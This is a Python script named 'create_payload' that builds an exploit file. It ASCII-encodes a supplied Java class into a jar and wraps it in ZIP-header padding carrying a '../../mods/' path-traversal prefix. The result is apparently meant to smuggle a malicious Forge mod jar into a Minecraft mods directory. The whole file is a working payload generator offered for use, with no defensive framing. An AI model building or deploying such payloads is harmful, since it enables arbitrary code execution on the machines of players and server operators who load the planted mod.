

import argparse
import asciijar1
import os
import paddingzip

PREFIX_DATA = "PK\3\4.jar\n../../mods/\nprivate\n#pgx0\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
SUFFIX_DATA = "\n"

def main():
    arg_parser = argparse.ArgumentParser(prog = "create_payload", description = "Generates a payload folder")
    arg_parser.add_argument('java_file', help = 'The Java file payload. Must contain a space for padding data.')
    arg_parser.add_argument('forge_jar_location')
    arg_parser.add_argument('class_name')
    arg_parser.add_argument('output_dir')

    args = arg_parser.parse_args()

    if not os.path.exists(args.output_dir):
        os.makedirs(args.output_dir)

    ascii_jar_loc = os.path.join(args.output_dir, "ascii-encoded.jar")
    with open(args.java_file, "rb") as java_file:
        asciijar1.do_ascii('B', f"{args.class_name}.class", f"{args.class_name}.class", ascii_jar_loc, args.forge_jar_location, args.class_name, java_file.read().decode("utf-8"))
    with open(ascii_jar_loc, "rb") as ascii_jar_file:
        padded_data = paddingzip.do_zip_mod(ascii_jar_file.read(), PREFIX_DATA, SUFFIX_DATA)
        with open(os.path.join(args.output_dir, "test.out"), "wb") as outf:
            outf.write(padded_data)
        padded_data_padding_removed = padded_data[len(PREFIX_DATA.encode()):]
        os.remove(ascii_jar_loc)
        unpadded_jar_loc = os.path.join(args.output_dir, "complete.jar")
        with open(unpadded_jar_loc, "wb") as unpadded_jar_file:
            unpadded_jar_file.write(padded_data_padding_removed)
if __name__ == "__main__":
    main()